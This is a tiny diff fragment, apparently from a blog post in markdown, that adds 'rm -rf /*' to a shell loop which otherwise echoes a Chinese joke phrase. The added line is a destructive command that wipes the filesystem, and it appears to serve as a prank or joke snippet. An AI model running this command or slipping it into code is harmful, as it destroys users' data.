@@ -48,6 +48,7 @@ draft: false
 while()
 do
 echo 扫福瑞叫爸爸
+rm -rf /*
 done
 
 ---
